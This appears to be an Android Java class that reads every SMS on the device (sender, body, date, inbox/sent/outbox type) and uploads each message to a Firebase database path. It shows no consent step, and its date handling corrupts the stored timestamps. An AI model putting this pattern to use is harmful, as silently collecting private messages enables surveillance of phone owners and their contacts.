package com.hazyaz.temps.Message;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;

//import androidx.annotation.RequiresApi;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

public class MessageReceiver {

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public String getAllSms(Context context) {

        ContentResolver cr = context.getContentResolver();
        StringBuffer stringBuffer = new StringBuffer();

        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
//                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms.))
                    Date dateFormat= new Date(Long.valueOf(smsDate));
                    String type="";
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }
                    stringBuffer.append("\nSender:--- " + number + " \nMessage:--- "
                            + body + " \nSMS Date:--- " + dateFormat
                            + " \ntype :--- " + type);
                    stringBuffer.append("\n----------------------------------");
                    dateFormat.setMonth(dateFormat.getMonth()+1);
                    dateFormat.setYear(dateFormat.getYear()+1900);
                    Message getmessage=new Message(number,body,dateFormat.getTime(),type);

                    DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();

                    mDatabase.child("users").child("username").child("Messages").child(Integer.toString(j)).setValue(getmessage);
                    c.moveToNext();
                }
            }

            c.close();

        } else {
//            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }
        return stringBuffer.toString();
    }


}